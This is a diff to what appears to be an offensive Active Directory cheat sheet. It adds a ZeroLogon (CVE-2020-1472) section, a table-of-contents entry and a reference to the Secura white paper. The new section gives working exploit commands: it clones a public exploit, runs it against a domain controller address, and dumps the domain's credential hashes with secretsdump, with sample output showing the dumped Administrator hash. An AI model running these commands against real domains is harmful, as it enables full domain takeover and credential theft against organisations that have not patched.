@@ -7,6 +7,7 @@
   - [Tools](#tools)
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
+    - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
@@ -269,6 +270,27 @@ Windows> net time /domain /set
 #### Mitigations
 
 * Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
+
+### CVE-2020-1472 ZeroLogon
+
+White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
+
+Exploit steps from the white paper
+
+1. Spoofing the client credential
+2. Disabling signing and sealing
+3. Spoofing a call
+4. Changing a computer's AD password
+5. From password change to domain admin
+
+```powershell
+$ git clone https://github.com/cube0x0/CVE-2020-1472
+$ python3 CVE-2020-1472.py DC01 10.10.10.10
+$ secretsdump.py 'domain/DC01$@DC01.domain.local' -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:00000000000000000000000000000000:::  
+```
 
 
 ### Open Shares
@@ -1749,3 +1771,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
 * [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
 * [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
+* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
